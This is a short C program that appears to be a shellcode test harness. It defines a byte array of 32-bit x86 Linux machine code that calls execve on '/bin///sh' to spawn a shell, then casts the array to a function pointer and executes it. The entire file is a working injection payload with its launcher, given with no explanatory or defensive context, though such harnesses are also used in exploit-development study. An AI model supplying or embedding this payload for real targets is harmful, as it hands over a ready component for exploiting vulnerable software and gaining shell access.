#include <stdio.h>
#include <string.h>

unsigned char code[] = {
    0x6a, 0x68, 0x68, 0x2f, 0x2f, 0x2f, 0x73, 0x68, 0x2f, 0x62, 0x69, 0x6e,
    0x89, 0xe3, 0x31, 0xc9, 0x6a, 0x0b, 0x58, 0x99, 0xcd, 0x80
};

int main(int argc, char **argv)
{
    printf("Length: %d\n", strlen(code));
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();
    return 0;
}
